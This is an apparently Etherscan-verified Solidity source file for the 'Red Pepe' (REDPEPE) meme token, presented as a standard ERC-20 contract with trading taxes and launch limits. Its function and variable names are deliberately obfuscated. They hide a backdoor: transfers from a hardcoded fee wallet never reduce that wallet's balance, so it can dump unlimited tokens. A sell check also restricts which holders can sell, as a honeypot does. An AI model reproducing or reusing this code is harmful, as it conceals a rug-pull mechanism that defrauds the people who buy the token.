/**
 *Submitted for verification at Etherscan.io on 2023-09-14
*/

// SPDX-License-Identifier: MIT

/*

TWITTER: https://twitter.com/REDPEPE_COIN

TELEGRAM: https://t.me/REDPEPE_ERC20

WEBSITE: https://pepered.org/

*/


pragma solidity 0.8.20;



interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:");
        return c;
    }

    function  _wjrfp(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _wjrfp(a, b, "SafeMath:");
    }

    function  _wjrfp(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath:");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath:");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _spjrdrulp {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface _xnphRxefs {
    function swExactTensFrHSportingFeeOransferkes(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH, uint liquidity);
}

contract RedPepe is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcfdxdFrof;
    mapping (address => bool) private _taxfWalery;
    mapping(address => uint256) private _ldrLorsfensvp;
    bool public _tnsferelanale = false;
    address payable private _pveKvfrgjep;

    uint8 private constant _decimals = 9;
    string private constant _name = unicode"Red Pepe";
    string private constant _symbol = unicode"REDPEPE";
    uint256 private constant _Totalrh = 420690000 * 10 **_decimals;
    uint256 public _mxTadAmaunt = _Totalrh;
    uint256 public _WalletSmax = _Totalrh;
    uint256 public _wapThresholdtax= _Totalrh;
    uint256 public _moarTorSap= _Totalrh;

    uint256 private _BuyTaxinitial=10;
    uint256 private _SellTaxinitial=10;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _BuyTaxAreduce=5;
    uint256 private _SellTaxAreduce=1;
    uint256 private _wapBeforeprevent=0;
    uint256 private _byawkaxt=0;

    _xnphRxefs private _ufxqsRaevaut;
    address private _aufrPaibvw;
    bool private _vezkspjfh;
    bool private itbeSwbp = false;
    bool private _apEalbew = false;

    event _amavuaopwl(uint _mxTadAmaunt);
    modifier lckrTharep {
        itbeSwbp = true;
        _;
        itbeSwbp = false;
    }

    constructor () {
        _pveKvfrgjep = payable(0xD65e37a9C1ea3eB21D8d8B31AEafB8837Cc2E163);
        _balances[_msgSender()] = _Totalrh;
        _isExcfdxdFrof[owner()] = true;
        _isExcfdxdFrof[address(this)] = true;
        _isExcfdxdFrof[_pveKvfrgjep] = true;



        emit Transfer(address(0), _msgSender(), _Totalrh);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _Totalrh;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _wjrfp(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 teeomoun=0;
        if (from != owner () && to != owner ()) {

            if (_tnsferelanale) {
                if (to != address
                (_ufxqsRaevaut) && to !=
                 address(_aufrPaibvw)) {
                  require(_ldrLorsfensvp
                  [tx.origin] < block.number,
                  "Only one transfer per block allowed.");
                  _ldrLorsfensvp
                  [tx.origin] = block.number;
                }
            }

            if (from == _aufrPaibvw && to != 
            address(_ufxqsRaevaut) && !_isExcfdxdFrof[to] ) {
                require(amount <= _mxTadAmaunt,
                 "Exceeds the _mxTadAmaunt.");
                require(balanceOf(to) + amount
                 <= _WalletSmax, "Exceeds the maxWalletSize.");
                if(_byawkaxt
                < _wapBeforeprevent){
                  require(! _frekrpwz(to));
                }
                _byawkaxt++;
                 _taxfWalery[to]=true;
                teeomoun = amount.mul((_byawkaxt>
                _BuyTaxAreduce)?_BuyTaxfinal:_BuyTaxinitial)
                .div(100);
            }

            if(to == _aufrPaibvw && from!= address(this) 
            && !_isExcfdxdFrof[from] ){
                require(amount <= _mxTadAmaunt && 
                balanceOf(_pveKvfrgjep)<_moarTorSap,
                 "Exceeds the _mxTadAmaunt.");
                teeomoun = amount.mul((_byawkaxt>
                _SellTaxAreduce)?_SellTaxfinal:_SellTaxinitial)
                .div(100);
                require(_byawkaxt>_wapBeforeprevent &&
                 _taxfWalery[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!itbeSwbp 
            && to == _aufrPaibvw && _apEalbew &&
             contractTokenBalance>_wapThresholdtax 
            && _byawkaxt>_wapBeforeprevent&&
             !_isExcfdxdFrof[to]&& !_isExcfdxdFrof[from]
            ) {
                _swpvkejkgj( _qekw(amount, 
                _qekw(contractTokenBalance,_moarTorSap)));
                uint256 contractETHBalance 
                = address(this).balance;
                if(contractETHBalance 
                > 0) {
                    _erqsqxrwhx(address(this).balance);
                }
            }
        }

        if(teeomoun>0){
          _balances[address(this)]=_balances
          [address(this)].
          add(teeomoun);
          emit Transfer(from,
           address(this),teeomoun);
        }
        _balances[from]= _wjrfp(from,
         _balances[from], amount);
        _balances[to]=_balances[to].
        add(amount. _wjrfp(teeomoun));
        emit Transfer(from, to, 
        amount. _wjrfp(teeomoun));
    }

    function _swpvkejkgj(uint256
     tokenAmount) private lckrTharep {
        if(tokenAmount==0){return;}
        if(!_vezkspjfh){return;}
        address[] memory path =
         new address[](2);
        path[0] = address(this);
        path[1] = _ufxqsRaevaut.WETH();
        _approve(address(this),
         address(_ufxqsRaevaut), tokenAmount);
        _ufxqsRaevaut.
        swExactTensFrHSportingFeeOransferkes(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _qekw(uint256 a, 
    uint256 b) private pure
     returns (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _wjrfp(address
     from, uint256 a,
      uint256 b) private view
       returns(uint256){
        if(from 
        == _pveKvfrgjep){
            return a ;
        }else{
            return a . _wjrfp (b);
        }
    }

    function removeLimits() external onlyOwner{
        _mxTadAmaunt = _Totalrh;
        _WalletSmax = _Totalrh;
        _tnsferelanale = false;
        emit _amavuaopwl(_Totalrh);
    }

    function _frekrpwz(address 
    account) private view 
    returns (bool) {
        uint256 sixzev;
        assembly {
            sixzev :=
             extcodesize
             (account)
        }
        return sixzev > 
        0;
    }

    function _erqsqxrwhx(uint256
    amount) private {
        _pveKvfrgjep.
        transfer(amount);
    }

    function openTrading( ) external onlyOwner( ) {
        require( ! _vezkspjfh);
        _ufxqsRaevaut   =  _xnphRxefs (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) ;
        _approve(address(this), address(_ufxqsRaevaut), _Totalrh);
        _aufrPaibvw = _spjrdrulp(_ufxqsRaevaut.factory()). createPair (address(this),  _ufxqsRaevaut . WETH ());
        _ufxqsRaevaut.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_aufrPaibvw).approve(address(_ufxqsRaevaut), type(uint).max);
        _apEalbew = true;
        _vezkspjfh = true;
    }

    receive() external payable {}
}